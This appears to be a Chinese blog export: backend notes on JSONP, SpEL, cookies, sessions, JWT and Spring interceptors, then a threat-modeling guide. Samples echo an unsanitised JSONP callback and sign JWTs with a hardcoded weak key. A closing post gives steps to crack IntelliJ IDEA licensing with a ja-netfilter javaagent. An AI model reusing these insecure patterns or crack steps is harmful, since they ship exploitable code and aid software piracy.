数据包装在该回调函数中，返回给客户端。 1234567891011function fetchDataFromDatabase() &#123; // 从数据库获取数据的示例 return &#123;&quot;name&quot;: &quot;John&quot;, &quot;age&quot;: 25&#125;;&#125;//得到回调函数名称var callbackName = req.query.callback;//获得所需的json数据var jsonData = fetchDataFromDatabase();//返回json格式的数据，其中包含一段可执行的函数（脚本）res.send(callbackName + &#x27;(&#x27; + JSON.stringify(jsonData) + &#x27;)&#x27;); 浏览器加载由服务器返回的脚本，并执行其中的 JavaScript 代码。这个脚本包含了客户端定义的回调函数，以及在这个回调函数中调用的实际数据。 1handleData(&#123;&quot;name&quot;:&quot;John&quot;, &quot;age&quot;: 25&#125;) SPELSpEL（Spring Expression Language）是Spring框架中的一种表达式语言，它提供了在运行时对对象图进行查询和操作的强大的表达式语言。SpEL主要用于处理Spring框架中的配置文件，如XML和注解中的属性值，以及在运行时进行动态计算和处理。 以下是SpEL的一些主要特性和用法： 表达式语法： SpEL提供了一种简单且强大的表达式语法，类似于其他主流的表达式语言，例如XPath、JavaScript等。它支持各种操作符、方法调用、属性访问等。 12@Value(&quot;#&#123;T(java.lang.Math).random() * 100.0&#125;&quot;)private double randomValue; 在注解中的应用： SpEL经常在Spring注解中使用，例如@Value、@Conditional等。通过在注解中使用SpEL表达式，可以在运行时动态计算属性值。 12@Value(&quot;#&#123;systemProperties[&#x27;java.home&#x27;]&#125;&quot;)private String javaHome; 访问对象属性和方法： SpEL允许访问对象的属性和方法。可以通过点号.来访问属性，通过括号[]来访问列表或映射中的元素。 12@Value(&quot;#&#123;user.name&#125;&quot;)private String userName; 条件表达式： SpEL支持条件表达式，类似于Java中的三元运算符。这允许在表达式中执行条件判断。 12@Value(&quot;#&#123;age &gt; 18 ? &#x27;Adult&#x27; : &#x27;Minor&#x27;&#125;&quot;)private String ageGroup; 集合投影和选择： SpEL支持对集合进行投影和选择操作。可以通过!操作符进行集合选择，通过?操作符进行集合投影。 12@Value(&quot;#&#123;&#x27;Spring&#x27; + &#x27; &#x27; + &#x27;Framework&#x27;&#125;&quot;)private String frameworkName; 类型引用和构造器引用： SpEL支持对类型进行引用，可以通过T()关键字引用Java类型。还支持构造器引用。 12@Value(&quot;#&#123;T(java.util.UUID).randomUUID()&#125;&quot;)private String uuid; SpEL广泛用于Spring框架中的配置文件、注解处理、条件判断等场景，它提供了一种灵活的方式来处理动态值和运行时计算。在使用SpEL时，应注意避免执行具有潜在安全风险的表达式，特别是在从用户输入中构建表达式时。 Cookie与SessionCookie Cookie不能跨域，固不能用在前后端分离项目中。 什么是 Cookie？ Cookie 是一种存储在用户计算机上的小型文本文件，由 Web 服务器生成，发送给浏览器，然后由浏览器保存。每当用户在同一网站再次访问时，浏览器会将该 Cookie 发送回服务器，以提供对用户信息的识别和跟踪。Cookie 主要用于记录用户的身份信息、用户的偏好设置、购物车内容等。 Cookie 的实现原理： 服务器生成 Cookie： 当用户首次访问一个网站时，服务器可以通过在响应头中设置 Set-Cookie 字段来生成一个或多个 Cookie。该字段包含 Cookie 的名称、值和一些属性（如过期时间、路径、域）。 1Set-Cookie: name=value; expires=Sat, 01 Jan 2022 00:00:00 GMT; path=/; domain=.example.com; HttpOnly; Secure 浏览器保存 Cookie： 浏览器在收到带有 Set-Cookie 头的响应后，会将 Cookie 保存在用户本地的 Cookie 存储中。 浏览器发送 Cookie： 在用户的每次请求中，浏览器都会将与请求匹配的 Cookie 发送给服务器。这是通过在请求头中添加 Cookie 字段来实现的。 1Cookie: name=value 服务器读取 Cookie： 服务器通过读取请求头中的 Cookie 字段来获取用户发送的 Cookie。服务器可以使用这些 Cookie 识别用户、维护会话状态或执行其他逻辑。 Cookie 的生命周期： Cookie 可以是会话 Cookie（仅在浏览器会话期间有效）或持久性 Cookie（在过期日期之前一直有效）。过期时间是通过 expires 或 max-age 属性设置的。 1Set-Cookie: name=value; expires=Sat, 01 Jan 2022 00:00:00 GMT 总体而言，Cookie 是一种简单而有效的机制，用于在客户端和服务器之间跟踪和维护状态。然而，由于其本地存储的特性，安全性问题和隐私问题也需要注意。因此，对于一些敏感信息，建议使用安全性更高的方法，如使用 HTTPS、将信息存储在服务器端等。 java代码实现过程123456789101112131415161718192021//S→C: 首次收到请求，生成cookie返回给客户端@GetMapping(&quot;/c1&quot;)public Result cookie1(HttpServletResponse response)&#123; Cookie cookie = new Cookie(&quot;login_username&quot;, &quot;erickin&quot;); response.addCookie(cookie); log.info(&quot;cookie已生成并返回, cookie_key:&#123;&#125;, cookie_value:&#123;&#125;&quot;, cookie.getName(), cookie.getValue()); return Result.success();&#125;//C→S: 其后的每个请求中将携带该cookie；@GetMapping(&quot;/c2&quot;)public Result cookie2(HttpServletRequest request)&#123; Cookie[] cookies = request.getCookies(); for(Cookie cookie : cookies)&#123; if(cookie.getName().equals(&quot;login_username&quot;))&#123; log.info(&quot;服务端cookie已捕获, cookie_key:&#123;&#125;, cookie_value:&#123;&#125;&quot;, cookie.getName(), cookie.getValue()); System.out.println(&quot;login_username:&quot; + cookie.getValue()); &#125; &#125; return Result.success();&#125; SessionSession 是一种在客户端和服务器之间保存状态的机制，用于跟踪用户的会话信息。Session 的主要目的是在用户与服务器之间建立一种持久性的状态，以便服务器能够识别用户并在用户访问不同页面或执行不同操作时保持状态。与 Cookie 不同，Session 数据存储在服务器上而不是在客户端。 Session 的实现原理： 会话标识符（Session ID）： 当用户首次访问一个网站时，服务器会为其分配一个唯一的 Session ID，通常是一个长随机字符串。这个 Session ID 通过 Cookie 或 URL 参数的方式发送给客户端。 客户端发送 Session ID： 客户端在每次请求时都会将之前收到的 Session ID 发送给服务器，通常是通过 Cookie 的方式发送。 1Cookie: JSESSIONID=abc123 1http://example.com/page?JSESSIONID=abc123 服务器端存储 Session 数据： 服务器接收到带有 Session ID 的请求后，会根据该 ID 查找相应的 Session 数据。Session 数据通常存储在服务器内存、数据库或其他持久化存储中。 Session 生命周期： Session 有一个生命周期，可以设置过期时间，通常通过 maxInactiveInterval 属性来定义。一旦会话超时或用户注销，Session 数据可能被销毁。 Session 的安全性： 为了提高安全性，Session ID 通常需要是难以猜测的复杂字符串，并且通过 HTTPS 传输以防止中间人攻击。另外，服务器可能会实现一些安全机制，如限制每个用户的并发会话数量。 分布式环境： 在分布式环境下，为了实现 Session 共享，通常会使用一些技术，如粘性会话、Session 复制、Session 集中存储等。 Java代码实现过程123456789101112131415161718//服务端生成session-key，返回给客户端保存，通常以cookie的形式将session-key返回。@GetMapping(&quot;/s1&quot;)public Result session1(HttpSession session)&#123; log.info(&quot;HttpSession-s1: &#123;&#125;&quot;, session.hashCode()); session.setAttribute(&quot;loginUser&quot;, &quot;Jimmy&quot;); return Result.success();&#125;//服务端收到客户端发送的session-key，在服务端中session表进行命中并得到相应的数据进行处理。@GetMapping(&quot;/s2&quot;)public Result session2(HttpServletRequest request)&#123; HttpSession session = request.getSession(); log.info(&quot;HttpSession-s2: &#123;&#125;&quot;, session.hashCode()); String loginUser = (String)session.getAttribute(&quot;loginUser&quot;); log.info(&quot;loginUser: &#123;&#125;&quot;, loginUser); return Result.success(loginUser);&#125; JWTJWT 是 JSON Web Token 的缩写，是一种用于在网络上安全地传递信息的开放标准（RFC 7519）。JWT 通常用于在用户和服务器之间传递身份验证信息，以及在不同服务之间传递声明（claims）信息。 一个 JWT 由三部分组成，它们使用点号（.）分隔开来： Header（头部）: 包含了两部分信息，即声明类型（”typ”）和使用的算法（”alg”）。 1234&#123; &quot;alg&quot;: &quot;HS256&quot;, &quot;typ&quot;: &quot;JWT&quot;&#125; 这个头部表示该令牌使用 HMAC SHA-256 算法进行签名（”HS256”）。 Payload（负载）: 包含了声明，也就是实际传输的数据，比如用户的身份信息和其他相关的声明。 12345&#123; &quot;sub&quot;: &quot;1234567890&quot;, &quot;name&quot;: &quot;John Doe&quot;, &quot;iat&quot;: 1516239022&#125; 这个负载包含了用户的主题（”sub”），名称（”name”），以及令牌的发行时间（”iat”）。 Signature（签名）: 使用头部中指定的算法对头部和负载进行签名，以确保数据在传输过程中没有被篡改。 这个签名是通过使用头部中指定的算法（在这个例子中是 HMAC SHA-256）和一个秘密密钥来生成的。 将这三部分以点号连接起来，就形成了一个完整的 JWT： 1eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c 在实际应用中，JWT 被用于验证用户的身份、生成用户令牌、实现单点登录（SSO）等场景。服务端可以使用密钥来验证 JWT 的签名，从而确认令牌的真实性。由于 JWT 是基于 JSON 格式的，它具有轻量、易于传递和解析的特点。 代码实现12345678910111213141516171819202122232425//令牌生成@Testpublic void testGenJwt()&#123; Map&lt;String, Object&gt; claims = new HashMap&lt;&gt;(); claims.put(&quot;id&quot;, 1); claims.put(&quot;name&quot;, &quot;Jimmy&quot;); String jwt = Jwts.builder() .signWith(SignatureAlgorithm.HS256, &quot;Erickin&quot;) //签名算法 .setClaims(claims) //添加负载 .setExpiration(new Date(System.currentTimeMillis())) //设置过期时间 .compact(); System.out.println(jwt);&#125;//令牌解析@Testpublic void testParseJwt()&#123; String temp = &quot;eyJhbGciOiJIUzI1NiJ9.eyJuYW1lIjoiSmltbXkiLCJpZCI6MSwiZXhwIjoxNzAyOTUzNTY1fQ.daYdqZy8Qjjme_NWJDmV-9Pp5kpuxGa_W7UwdV5d0Vc&quot;; Claims claims = Jwts.parser() .setSigningKey(&quot;Erickin&quot;) .parseClaimsJws(temp) .getBody(); System.out.println(claims);&#125; Filter &amp; Interceptor过滤器 将前端对后端的请求进行拦截，从而实现相应的功能，比如登录校验、统一编码处理、敏感字符处理等； Filter快速入门1.实现Filter接口 12345678910111213141516171819202122232425262728package com.erickin.filter;import javax.servlet.*;import javax.servlet.annotation.WebFilter;import java.io.IOException;//通过这个注解指定哪个api接口将会被拦截过滤//implements Filter: 实现Filter接口@WebFilter(urlPatterns = &quot;/*&quot;)public class DemoFilter implements Filter &#123; @Override public void init(FilterConfig filterConfig) throws ServletException &#123; System.out.println(&quot;DemoFilter.init已执行&quot;); &#125; @Override public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123; System.out.println(&quot;DemoFilter拦截到了请求.....放行前逻辑&quot;); filterChain.doFilter(servletRequest, servletResponse); System.out.println(&quot;DemoFilter拦截到了请求.....放行后逻辑&quot;); &#125; @Override public void destroy() &#123; System.out.println(&quot;DemoFilter.destory已执行&quot;); &#125;&#125; 2.配置注解 WebFilter(urlPatterns=&quot;/*&quot;): 加在filter实现类上； 拦截路径 urlPatterns值 含义 拦截具体路径 &#x2F;login 只有访问&#x2F;login路径时，才会被拦截 目录拦截 &#x2F;emps&#x2F;* 访问&#x2F;emps下的所有资源，都会被拦截 拦截所有 &#x2F;* 访问所有资源，都会被拦截 ServletComponentScan: 加在Application启动类上； 过滤器链 一个web应用中，可以配置多个过滤器，这多个过滤器就形成了一个过滤器链； 注解配置的filter，优先级按照过滤器类名（字符串）的自然排序，比如abcFilter会在demoFilter之前执行，到应用程序执行后，会按顺序依次推出过滤器链执行后逻辑。 Interceptor快速入门1.创建HandlerInterceptor接口的实现类 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768package com.erickin.Interceptor;import com.alibaba.fastjson.JSONObject;import com.erickin.Util.JwtUtils;import com.erickin.pojo.Result;import lombok.extern.slf4j.Slf4j;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.stereotype.Component;import org.springframework.util.StringUtils;import org.springframework.web.servlet.HandlerInterceptor;import org.springframework.web.servlet.ModelAndView;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;@Slf4j@Componentpublic class LoginCheckInterceptor implements HandlerInterceptor&#123; @Autowired JwtUtils jwtUtils; @Override public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception &#123; String url = request.getRequestURL().toString(); log.info(&quot;请求的url: &#123;&#125;&quot;, url); if(url.contains(&quot;login&quot;))&#123; log.info(&quot;登录操作，放行...&quot;); return true; &#125; String jwt = request.getHeader(&quot;token&quot;); if(!StringUtils.hasLength(jwt))&#123; log.info(&quot;请求头token为空，返回未登录信息&quot;); Result error = Result.error(&quot;NOT_LOGIN&quot;); String notlogin = JSONObject.toJSONString(error); response.getWriter().write(notlogin); return false; &#125; try &#123; jwtUtils.parseJwt(jwt); &#125;catch (Exception e)&#123; e.printStackTrace(); log.info(&quot;解析令牌失败，返回未登录错误信息&quot;); Result error = Result.error(&quot;NOT_LOGIN&quot;); String notlogin = JSONObject.toJSONString(error); response.getWriter().write(notlogin); return false; &#125; log.info(&quot;令牌合法，放行&quot;); return true; &#125; @Override public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception &#123; System.out.println(&quot;postHandle......&quot;); &#125; @Override public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception &#123; System.out.println(&quot;afterCompletion......&quot;); &#125;&#125; 分别实现三个方法： preHandle：拦截前方法； postHandle：拦截后方法； afterCompletion：最终方法。 一般在拦截前和拦截后方法中实现逻辑。 2.创建配置类（WebMvcConfigurer实现类） 1234567891011121314151617181920package com.erickin.config;import com.erickin.Interceptor.LoginCheckInterceptor;import com.sun.deploy.util.WinRegistry;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.context.annotation.Configuration;import org.springframework.web.servlet.config.annotation.InterceptorRegistry;import org.springframework.web.servlet.config.annotation.WebMvcConfigurer;@Configurationpublic class WebConfig implements WebMvcConfigurer &#123; @Autowired private LoginCheckInterceptor loginCheckInterceptor; @Override public void addInterceptors(InterceptorRegistry registry) &#123; registry.addInterceptor(loginCheckInterceptor).addPathPatterns(&quot;/**&quot;).excludePathPatterns(&quot;/login&quot;); &#125;&#125; 在方法中，分别指定过滤路径和白名单路径。","categories":[{"name":"后端","slug":"后端","permalink":"https://erickinyae.github.io/categories/%E5%90%8E%E7%AB%AF/"}],"tags":[]},{"title":"威胁建模","slug":"威胁建模","date":"2023-11-20T01:22:37.000Z","updated":"2023-12-05T06:51:05.717Z","comments":true,"path":"2023/11/20/威胁建模/","permalink":"https://erickinyae.github.io/2023/11/20/%E5%A8%81%E8%83%81%E5%BB%BA%E6%A8%A1/","excerpt":"","text":"Note by Eric. 如何做好威胁就建模：https://tech.meituan.com/2021/04/08/threat-modeling-security.html 安全架构评审实战：https://mp.weixin.qq.com/s/YQn1FQICk1esxvBCHZntFA 威胁建模图例：https://zhuanlan.zhihu.com/p/73205112 微软威胁建模教程：https://learn.microsoft.com/zh-cn/training/modules/tm-introduction-to-threat-modeling/1-introduction 工具 工具 教程 Microsoft Threat Modeling https://learn.microsoft.com/zh-cn/azure/security/develop/threat-modeling-tool-feature-overview 安全需求 安全需求 OWASP ASVS 简述威胁建模实践使开发团队可以在计划的运行环境的背景下，以结构化的方式思考、记录并讨论系统设计的安全影响。威胁建模是帮助保护系统、应用程序、网络和服务的有效方法。这是一种工程技术，用于识别潜在的威胁和建议，以帮助降低风险并在开发生命周期的早期实现安全目标。 在业内也有STRIDE、Trike、OCTAVE等多种方法论实践。 在研发团队的安全例行活动中，对于一些拥有重要数据资产、安全事件影响力大的系统除了要进行常规的渗透测试、黑白盒代码扫描之外，更应该系统地定期开展威胁建模活动并对业务赋能。 威胁是应用潜在存在的安全弱点。 漏洞是对威胁的利用，产品实现了预期之前的功能，影响了安全性。 Bug是未实现的功能。 风险是发生的，对资产有危害的可能性。 风险&#x3D;（威胁+漏洞）*可能性。 威胁建模的价值 识别体系化的结构缺陷：大多数安全问题是设计缺陷问题，而不是安全性错误。威胁建模能帮助识别这些设计缺陷，从而减少风险敞口，指导安全测试，并降低因安全漏洞而造成的品牌损害或财务损失等可能性。 节约组织安全成本：通过对威胁进行建模，并在设计阶段建立安全性需求，降低安全设计缺陷导致的修复成本。在需求管理和威胁分析阶段，与业务开发团队高效互动，释放安全团队的专业能力，专注于高性价比的安全建设。 落地DevSecOps文化：通过威胁建模跑通开发和安全工具的流程集成，把风险管理嵌入产品的完整生命周期，从而推动形成完整的DevSecOps工具链。 满足合规要求：威胁建模是国际安全行业通用的方法论，通过向管理层和监管机构提供产品的风险管理活动的完整记录，帮助团队遵守全球法律法规要求，包括PCI DSS、GDPR、HIPAA、CSA STAR等。 威胁建模的阶段性成果交付物会是不同形式，如安全白皮书、安全设计指导、威胁评估报告。业务团队可以从安全给出的长期修复方案和安全规划中获益。最终报告最好有安全团队内部双人复核机制，不同安全专家视角里对威胁的理解是不一样的，双人复核的另一个好处是可以减少工作量，比如分工区分A-管理端、B-Agent、A-代码、B-设计实现或者A-评审、B-复查分工。给出威胁建模结果前一定要同业务团队再次 沟通，确认哪些风险是安全视角被错误理解的，哪些是已经在业务视野中，哪些是业务团队认知不到位的。修复方案要区分接受、缓解、转移、处理风险四种情况。沟通时对应报告每个威胁项要求业务方给出明确的排期。短期可以走安全工单，长期纳入业务的规划排期中，识别出的共性安全问题作为安全专项制定孵化相应的安全工具和项目，补全安全建设的蓝图。 威胁建模实施绘制数据流图，识别定义威胁、处置威胁、验证风险得到正确处理是威胁建模的四个常用步骤。 为什么我们需要建模？因为实施威胁建模时往往系统并未完整构建（无代码或代码不完整），模型会帮助思考系统的设计，以攻击者和防守方的方式思考对应的安全威胁。 使用威胁建模工具、审查数据流图、威胁模型的目标都是为了达成更充分讨论的目的而服务。 安全团队基于业务的流程图、调用关系同业务一起绘制DFD数据流图（业务现有文档中的时序图、UML图辅助理解复杂问题和技术细节）； 绘制DFD的工具： 微软的Microsoft Threat Modeling Tool工具的优点是，适合初学者接触熟悉了解外部实体、数据流、过程、存储、信任边界的基本概念，缺点是除了Windows应用程序和Azure示例之外没有合适的威胁模板。 OWASP Threat Dragon的优点是表达方式更丰富，但是不能支持动态拖拽和自动导出威胁列表。大家没有必要将整理数据流图视为困难，实战中威胁建模能力只能通过多练习、反复挑战的方法熟悉技能。 识别威胁 第一步是灵活定义攻击者的目标，组织要保护的资产和信任级别，如：S3存储、源代码、主机、数据库、凭据、行级数据，知识产权等。公有云、私有云不同的责任共担模型就清晰给出了不同的业务需要关注哪些资产的示例，云上资产的建模更关注安全的信任边界。 第二步给出明确的攻击路径，定义攻击者：比如恶意内部员工、外部攻击者，竞争对手、好奇者等，攻击路径的抉择直接影响攻击面和信任边界的划定。 第三步即威胁评估的过程不能缺少架构分类思维。一般使用 ASTRIDE（隐私、欺骗、篡改、信息泄露、否认性、拒绝服务和特权提升）和攻击树模型作为常用的威胁建模技术指导原则。 威胁建模理论模型 - ASTRIDE 威胁 安全属性 定义 举例 隐私(Privacy) 隐私保护 用户信息防护 用户隐私被查阅 仿冒(Spooling) 认证 冒充人和物 冒充其他用户、服务账号 篡改(Tampering) 完整性 修改数据或代码 修改存储的信息 抵赖(Repudiation) 审计 不承认做过的行为 日志、审计 信息泄露(Information Disclosure) 保密性 信息被泄露或窃取 数据库信息被泄露 拒绝服务(Dos) 可用性 消耗资源、服务不可用 高危操作导致不可用 权限提升(Elevation of privilege) 授权 未经授权获取、提升权限 普通用户提升到管理员 将系统分解为相关的组件，分析每个组件对应的威胁。 从外部实体逐次开始，关注有交互的进程，没有交互的进程一般没有威胁。 元素 P隐私 S仿冒 T篡改 R抵赖 I泄露 D拒绝 E提权 外部实体 √ √ 进程 √ √ √ √ √ √ √ 数据存储 √ √ √ √ √ 数据流 √ √ √ √ 威胁建模四阶段 阶段 标题 描述 1 设计 明确系统的所有要求，并创建数据流关系图。 2 中断 将威胁建模框架应用到数据流关系图，并查找潜在的安全问题。 3 修复 确定如何正确组合安全控制来解决每个问题。 4 验证 验证是否满足了要求，找到了问题并实现了安全控制。 步骤1 设计目的 清楚地了解系统的工作原理 列出系统使用的每个服务 枚举有关环境和默认安全配置的所有假设 使用正确的上下文深度级别创建数据流关系图 提出问题 区域 问题 系统说明 系统的功能是什么？ 服务处理的业务流程是什么？ 是否明确定义了这些流程？ 系统环境 系统是在云中还是在本地构建的？ 它将在哪个 OS 上构建？ 是否将使用容器？ 系统是应用程序、服务还是其他完全不同的东西？ 方案 用户将如何使用系统？ 如何不使用系统？ 权限 系统是否有脚本执行、数据或硬件访问要求？ 如果有，是哪些要求？ 云提供商 系统将使用哪个云提供商？ 它提供哪些默认安全配置选项？ 这些选项如何影响系统安全要求？ 操作系统 系统将使用哪种操作系统？ 它提供哪些默认安全配置选项？ 这些选项如何影响系统安全要求？ 第一方和第三方 系统将使用哪些第一方和第三方服务？ 它们提供哪些默认安全配置选项？ 这些选项如何影响系统安全要求？ 帐户 系统中将使用哪些帐户类型，例如用户和管理员？ 这些帐户是本地帐户还是云帐户？ 它们需要哪些访问权限？为什么？ 标识和访问控制 系统将如何帮助保护这些帐户？ 它是否依赖于 Microsoft Entra ID？ 是否会使用访问控制列表 (ACL)、多重身份验证 (MFA) 和会话控制等功能？ 令牌和会话 系统会处理 SOAP API 或 REST API 之类的请求吗？ 它将如何处理不同的会话？ 旁路 系统是否使用或需要后门？ 如果需要，它将如何工作？ 记录、监视和备份 系统使用什么机制来记录安全事件、监视异常和备份系统数据？ 它会捕获哪些事件类型？ 网络 将使用哪些入侵检测和保护系统？ 如何对通信进行加密？ 数据 系统将创建或处理什么类型的数据？ 数据分类类型是什么？ 系统如何信任数据源？ 它将如何分析数据？ 预期的输入和输出行为是什么？ 如何处理验证？ 如何在所有状态下对数据进行加密？ 机密管理 系统如何处理密钥、证书和凭据？ 创建数据流图数据流图的组成如下： 元素 形状 定义 过程 接收、修改输入或将输入重定向到输出的任务，如 Web 服务。 数据存储 永久和临时数据存储，如 Web 缓存和 Azure 托管数据库。 外部实体 直接控制之外的任务、实体或数据存储，如用户和第三方 API。 数据流 进程、数据存储和外部实体之间的数据移动，如连接字符串和有效负载。 信任边界 信任区域在数据流经系统时更改，如用户使用 Internet 访问受保护的公司网络时。 数据流图表中应该包含的信息量数据流关系图中包含的信息量取决于几个关键因素： 因素 说明 正在构建的系统类型 如果系统不处理敏感数据或仅在内部使用，则它需要的上下文可能比面向外部的系统要少 安全团队所需的上下文 安全团队在威胁模型中的目标非常精确。 与安全团队交流，确认所需的层次 关系图层次为了帮助你了解要包含的信息量，请在以下四个上下文层次之间进行选择： 层次 标题 说明 0 系统 任何系统的基础。 数据流关系图包含系统的主要部分，并提供足够的上下文，可帮助你了解其工作原理及彼此交互方式。 1 流程 使用额外的数据流关系图，关注系统每个部分的数据流关系图。 用于每个系统，尤其是处理敏感数据的系统。 此层的上下文应有助于确定威胁以及更有效地降低或消除风险的方法。 2 子过程 关注系统中某一部分的每个次级部分的数据流关系图。 用于关键的系统。 示例包括适用于安全环境的系统、处理高度敏感数据的系统或包含高风险评级的系统。 3 更详细 关注高度关键的内核级系统。 数据流关系图详细描述每个子过程。 步骤2 中断在中断阶段，需使用数据流关系图查找针对系统的潜在威胁。 此过程使用威胁建模框架，以帮助你查找最常见的威胁和防范威胁的方法。 选择以“保护系统”或“了解攻击者”为核心的方法 使用 STRIDE 框架识别常见威胁 确定方法侧重点首先，选择是要找到保护系统的方法，还是想要尽可能地了解攻击者及其动机。 示例包括： 侧重点 可以查找的内容示例 系统 发现用户与系统之间的未加密连接存在问题。 攻击者 进一步了解方法、动机和强化系统入口点的方法。 资产 基于分类数据处理等功能确定关键资产，主要专注于保护这些资产。 选择威胁框架接下来，选择一个框架，帮助生成系统中的潜在威胁。通常使用 STRIDE（六个主要威胁类别的首字母缩写）提供广泛但不完整的威胁列表。 此框架可帮助你提出有关系统的几个重要问题： 威胁 定义 问题 威胁示例 Privacy隐私 隐私保护 用户信息防护 用户隐私被查阅 Spooling欺骗 攻击者冒充某人或某物 通信的双方是否都通过了身份验证？ 通过看似合法的帐户向用户发送一封带有恶意链接和附件的电子邮件，以捕获用户的凭据、数据和设备访问权限 Tampering篡改 攻击者在未经授权的情况下更改数据 如何得知某人无法更改传输中的数据、正在使用的数据或静态数据？ 通过弱 API 调用处理修改内存，导致崩溃和泄漏敏感错误消息 Repudiation否认性 攻击者声称尚未执行任何操作 每个操作是否可以绑定到标识？ 声称没有删除数据库记录 Information Disclosure信息泄露 攻击者看到了不应看到的数据 如何得知某人无法看到传输中的数据、正在使用的数据或静态数据？ 访问安全控制较弱的未授权文档和文件夹 Dos拒绝服务 攻击者使你的系统崩溃 系统中是否存在资源受限的区域？ 向网络发送大量请求 Elevation of privilege权限提升 攻击者未经授权而可访问数据 如何得知某人可以执行此操作？ 利用输入处理逻辑或内存中的弱点来提取数据 步骤3 修复在修复阶段，需要决定如何处理所有威胁。 每个 STRIDE 威胁都对应到一项或多项安全控制，这些控制措施提供不同的功能和类型供你选择。 目标 根据优先级框架或安全 bug 栏衡量每个威胁的优先级 在 bug 管理服务中将每个威胁作为任务或工作项进行跟踪 生成对应于 STRIDE 威胁的安全控制建议 选择一项或多项安全控制类型和功能来应对每个威胁 解决任务 设置威胁跟踪工作流确定威胁的优先级首先，根据优先级框架或安全 bug 栏来衡量每个威胁。 此过程可帮助你计划资源来解决对组织而言更重要的问题。 此过程使用三个关键变量： 变量 说明 影响 使用 STRIDE 类别分配影响 严重性 使用内部 bug 栏或优先级框架来分配最坏情况下的严重性 风险 对安全控制有效性和实现成本进行计算 评估威胁有效性和成本查看对应于 STRIDE 威胁的每项安全控制建议。 记下最有效和成本最低的建议。 以下是一些示例： 威胁 安全控制 安全控制示例 欺骗 身份验证 发送和接收使用数字签名进行签名的消息，以验证来源并确保消息完整性 篡改 完整性 验证输入以防止处理恶意有效负载和错误处理意外行为 否认性 不可否认性 创建和保护包含用户操作和时间戳的安全日志 信息泄露 保密性 应用访问控制列表，以确保合适的用户可以访问适当的数据 拒绝服务 可用性 使用弹性资源管理不断增加或减少的使用量 权限提升 授权 使用最少的访问量运行服务 安全控制措施类型和功能安全控制具有不同的类型和功能。 结合使用时，它们有助于保护系统的安全，并创建多个安全保护层，也称为深层防御。 你可以选择一种或多种安全控制类型： 物理类型，如摄像头 技术类型，如加密 管理类型，如策略 它们可能有一项或多项安全控制功能： 函数 描述 预防 降低威胁的概率或影响，如防火墙 检测 识别发生的攻击，如监视 纠正 控制系统如何响应其受到的攻击，如系统修补程序 修复 从攻击中恢复系统，如备份 阻碍 阻止攻击者访问系统，如最低权限 为每个问题添加安全控制详细信息在 bug 管理解决方案中为每个问题添加详细信息，然后使用以下其中一个解决方案解决各个问题。 这在不同组织之间存在略微差异： 解决方案 描述 减轻 将通过 Bug 修复或重新设计来解决问题，以减轻或消除威胁影响和严重性。 转移 由其他系统或团队处理问题。 避免 去除系统中包含问题的部分。 接受 没有解决方案，将接受风险。 需要经授权的风险决策者的批准，其中决策者可能取决于威胁的严重性。 严重威胁可能需要高级领导的批准，而深层防御风险可能需要高级工程师批准。 与你的团队交流以获得战略指导。 步骤4 验证验证阶段是威胁建模过程的最后一步，通常发生在部署系统之前。 它涉及到确保满足要求、验证假设以及准备好安全控制。 目标 确认系统满足所有新旧安全要求 配置云提供商、操作系统和组件以满足安全要求 确保使用正确的安全控制解决所有问题 在部署前对系统进行手动和自动验证 验证要求和设置默认值首先，验证是否满足第一阶段创建的所有要求。 示例： 网络安全计划 机密管理解决方案实施 日志记录和监视系统 标识和访问控制 然后，确保云提供商、操作系统和组件的默认配置设置已更改，可满足所有安全要求。 示例： 启用 Azure SQL 数据库透明数据加密以保护磁盘上的数据 使用基于角色的访问控制 (RBAC) 向用户、组和应用程序分配权限 跨所有配置文件启用 Windows 防火墙 应解决 bug 管理解决方案中记录的所有问题并验证所有修补程序。 执行验证最后一部分涉及运行手动和自动验证。部署系统之前必须对其进行验证，验证过程可能包含自动扫描程序、代码评审和渗透测试。 可以在每次部署之前或隔一定的时间（如每 6 - 12 个月）强制执行该过程。 如果以下任一问题的答案为“是”，最好设置较短的验证周期： 我的系统会在部使用吗？ 它可以处理机密数据吗？ 我必须遵守某些规定吗？ 我的组织是否要求实施其他安全保护过程，以应对隐私影响、运营风险或开发要求？","categories":[{"name":"安全","slug":"安全","permalink":"https://erickinyae.github.io/categories/%E5%AE%89%E5%85%A8/"}],"tags":[]},{"title":"problem-resolved","slug":"problem-resolved","date":"2023-11-17T07:13:06.000Z","updated":"2023-12-19T07:19:01.121Z","comments":true,"path":"2023/11/17/problem-resolved/","permalink":"https://erickinyae.github.io/2023/11/17/problem-resolved/","excerpt":"","text":"Finalshell无法上传文件问题连接管理器 -&gt; 编辑 -&gt; 认证，登录的信息必须是root用户。 IDEA2022.3.1 激活失效激活方式：https://www.exception.site/essay/idea-yongjiu-jihuoma 在 idea64.exe.vmoptions（idea&#x2F;bin&#x2F;) 配置文件结尾添加如下配置： 123456# 引用补丁，开头必须以 -javaagent: 开头，后面跟着补丁的绝对路径（可根据你实际的位置进行修改）,注意路径一定要填写正确，且不能包含中文，否则会导致 IDEA 无法启动-javaagent:D:/ja-netfilter/ja-netfilter.jar# 最新 IDEA 版本需要添加下面两行，以支持 Java 17, 否则会报 Key is invalid--add-opens=java.base/jdk.internal.org.objectweb.asm=ALL-UNNAMED--add-opens=java.base/jdk.internal.org.objectweb.asm.tree=ALL-UNNAMED 激活码获取：https://docs.qq.com/doc/DUXhVa0NLaFB1elVz 当前使用的： 